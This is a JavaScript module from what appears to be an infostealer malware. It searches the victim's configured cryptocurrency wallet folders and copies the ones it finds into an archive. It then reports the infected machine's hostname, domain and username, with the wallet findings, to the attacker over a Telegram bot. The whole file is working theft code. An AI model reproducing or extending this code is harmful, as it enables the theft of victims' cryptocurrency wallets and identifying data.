module.exports = (client) => {
    return {

        async getWallets() {
            var description = "";

            client.utils.jszip.createFolder("\\Wallets");

            for (let [key, value] of Object.entries(client.config.wallets.directory)) {
                if (client.requires.fs.existsSync(value)) {
                    description += `${key}: ✔️\n`;
                    client.utils.jszip.copyFolder(`\\Wallets\\${key}`, value);
                    client.config.counter.wallets++;
                } else {
                    description += `${key}: ❌\n`;
                }
            }

            if (description != "") {
                client.utils.jszip.createTxt("\\Found Wallets.txt", "<================[ Network Data ]>================>\n<================[t.me/turcoflex]>================>\n\n" + description)
            }

            await client.utils.telebot.send2Message(`💉 Infected - ${client.utils.encryption.decryptData(client.config.user.hostname)}/${client.utils.encryption.decryptData(client.config.user.user_domain)}/${client.utils.encryption.decryptData(client.config.user.username)}\n💰 **Wallet search | Result**\n${description}`)
        }
    };
};